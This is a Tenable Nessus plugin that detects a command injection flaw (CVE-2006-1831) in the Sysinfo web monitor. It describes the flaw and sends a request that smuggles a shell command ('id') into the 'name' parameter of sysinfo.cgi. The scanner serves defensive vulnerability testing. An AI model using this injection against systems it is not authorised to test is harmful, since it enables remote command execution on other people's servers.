#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a Perl script that is susceptible to
arbitrary command execution attacks. 

Description :

The remote host is running Sysinfo, a web-based system monitor. 

The version of Sysinfo installed on the remote host fails to sanitize
user-supplied input to the 'name' parameter before passing it to a
shell for execution.  An unauthenticated attacker may be able to
exploit this issue to execute arbitrary shell commands on the remote
host subject to the privileges of the web server user id. 

See also :

http://downloads.securityfocus.com/vulnerabilities/exploits/sysinfo_poc

Solution :

Upgrade to Sysinfo version 2.25 or later. 

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description)
{
  script_id(21237);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-1831");
  script_bugtraq_id(17523);

  script_name(english:"Sysinfo name Parameter Code Execution Vulnerability");
  script_summary(english:"Tries to execute arbitrary code using Sysinfo");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/cgi-bin/sysinfo", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw.
  #
  # nb: this won't actually return any command output but cmd must
  #     be a valid command.
  cmd = "id";
  exploit = string(SCRIPT_NAME, ";", cmd);
  req = http_get(
    item:string(
      dir, "/sysinfo.cgi?",
      "action=systemdoc&",
      "name=", exploit
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like the name value was accepted.
  if (string("Dokumentation von ", exploit) >< res)
  {
    security_hole(port);
    exit(0);
  }
}
